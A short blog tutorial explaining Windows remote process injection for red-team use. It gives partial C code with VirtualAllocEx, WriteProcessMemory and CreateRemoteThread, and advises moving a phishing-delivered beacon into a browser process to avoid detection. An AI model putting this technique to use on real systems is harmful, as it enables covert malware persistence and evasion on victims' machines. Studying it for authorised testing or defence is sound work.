---
title: Remote Process Injection
date: 2023-03-14 12:00:00 -500
categories: [blog]
tags: [code_execution]

---

# What is process injection and why do we need it?

Process injection is the act of creating a copy of your shellcode in the current process and copying it across to the memory space of a different process and remotely executing that code.

There are mulitiple ways of getting initial access during a Red Team campaign, but, through whichever means you get a successful beacon out to your control server, your first call home will be short lived most of the time. If you use phishing or a Trojan for instance, you would want to migrate your beacon code to a more stable long term process that will not die when the victim closes the application. Process injection can also be helpful if you are concerned about OPSEC. Migrating your code/beacon over to a web browser process will blend in much better than calc connecting out to the internet.  

# Implementing Process Injection

Process injection involves much of the same steps as we have already discussed in [this](https://coppertop-6.github.io/posts/Windows_Dropper/) post. We will make use of 3 Windows APIs that were designed for debugging processes, namely [VIrtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) and [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread). You might recognise these APIs and that is because it is the same APIs we used during the dropper design phase, but only for use in remote processes.

```c#
LPVOID pRemoteCode = NULL;
HANDLE hThread = NULL;

pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
```  

```c#        
WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
```

```c#
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
if (hThread != NULL) {
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    return 0;
    }
    return -1;
```
